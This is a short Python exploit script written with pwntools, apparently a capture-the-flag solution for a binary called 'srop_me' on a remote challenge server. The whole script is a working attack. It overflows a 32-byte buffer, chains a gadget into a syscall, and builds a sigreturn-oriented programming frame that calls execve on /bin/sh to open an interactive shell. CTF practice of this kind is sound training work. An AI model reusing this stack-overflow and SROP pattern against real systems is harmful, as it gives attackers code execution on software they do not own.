from pwn import *

elf = context.binary = ELF("./srop_me", checksec = False)
r = process()
r = remote("challs.n00bzunit3d.xyz", 38894)

syscall = 0x401019
binsh = 0x40200f
mov_edx_0xf = 0x401014

payload = b"a" * 32 + p64(0x000000000040101b) + p64(syscall)

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = binsh           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = syscall

payload += bytes(frame)
r.sendline(payload)
r.interactive()